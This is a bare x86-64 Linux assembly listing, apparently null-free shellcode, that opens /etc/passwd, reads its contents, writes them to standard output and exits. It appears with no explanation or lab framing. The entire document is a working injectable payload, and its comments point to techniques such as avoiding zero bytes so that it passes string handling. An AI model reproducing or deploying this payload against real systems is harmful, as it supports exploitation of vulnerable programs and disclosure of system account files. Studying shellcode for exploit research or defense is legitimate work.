_start:

filename:
    xor esi, esi
    mul esi

    push rdx    ; '\0'

    mov rcx, 0x6477737361702f63  ; 'c/passwd'
    push rcx

    mov rcx, 0x74652f2f2f2f2f2f  ; '//////et'
    push rcx

openfile:
    push rsp
    pop rdi

    mov al, 0x2
    syscall

readfile:
    push rax
    pop rdi
    
    push rsp
    pop rsi
    
    push rdx
    push rdx        ; saving lots of 0's
    push rdx
    push rdx
    pop rax
    mov dx, 0x999
    syscall

write:
    pop rdi
    inc edi
    
    push rax
    pop rdx
    pop rax
    inc eax
    syscall

leave:
    pop rax
    mov al, 60
    syscall
